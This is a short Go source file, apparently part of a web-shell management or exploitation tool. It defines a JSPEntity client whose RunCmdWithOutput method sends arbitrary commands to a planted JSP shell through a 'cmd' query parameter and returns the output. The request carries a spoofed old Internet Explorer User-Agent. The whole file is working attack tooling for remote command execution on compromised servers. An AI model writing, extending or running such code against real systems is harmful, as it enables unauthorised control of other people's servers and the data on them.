package entity

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

type JSPEntity struct {
	Target  string
	Command string
}

func (e *JSPEntity) RunCmdWithOutput(cmd string) (string, error) {
	client := http.Client{Timeout: 30 * time.Second}
	api := fmt.Sprintf("%s?cmd=%s", e.Target, cmd)
	req, err := http.NewRequest("GET", api, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)")
	req.Header.Set("Connection", "close")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(data), nil
}
